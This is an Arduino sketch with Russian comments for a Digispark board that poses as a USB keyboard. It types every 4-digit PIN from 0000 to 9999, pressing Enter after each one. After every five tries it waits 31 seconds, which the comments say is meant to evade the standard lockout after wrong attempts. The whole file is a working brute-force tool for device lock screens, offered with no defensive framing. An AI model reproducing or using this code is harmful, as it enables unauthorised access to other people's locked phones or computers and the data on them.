#include "DigiKeyboard.h"

// Настройка пина для светодиода (на Digispark Model A используется пин 1, на Model B - пин 0)
#define LED_PIN 1

void setup() {
  // Настраиваем пин светодиода как выход
  pinMode(LED_PIN, OUTPUT);
  
  // Небольшая задержка для инициализации USB
  DigiKeyboard.delay(3000);
}

void loop() {
  // Перебираем все PIN-коды от 0000 до 9999
  for (int pin = 0; pin <= 9999; pin++) {
    
    // Каждые 5 попыток делаем большую паузу (защита от блокировки)
    if (pin % 5 == 0 && pin > 0) {
      // Включаем светодиод на время паузы
      digitalWrite(LED_PIN, HIGH);
      
      // Ждём 31 секунду (стандартное время блокировки после 5 неверных попыток)
      for (int i = 0; i < 31; i++) {
        DigiKeyboard.delay(1000);
      }
      
      // Выключаем светодиод
      digitalWrite(LED_PIN, LOW);
    }
    
    // Форматируем число в 4-значный PIN (например, 1 -> "0001")
    String pinStr = String(pin);
    while (pinStr.length() < 4) {
      pinStr = "0" + pinStr;
    }
    
    // Отправляем PIN-код как нажатия клавиш
    DigiKeyboard.print(pinStr);
    
    // Нажимаем Enter (подтверждение ввода)
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(0); // Отпускаем все клавиши
    
    // Небольшая задержка перед следующей попыткой
    DigiKeyboard.delay(2000); // 2 секунды между попытками
    
    // Мигаем светодиодом после каждой успешной отправки
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(50);
    digitalWrite(LED_PIN, LOW);
  }
  
  // После завершения всех попыток мигаем светодиодом
  while (true) {
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(LED_PIN, LOW);
    DigiKeyboard.delay(500);
  }
}
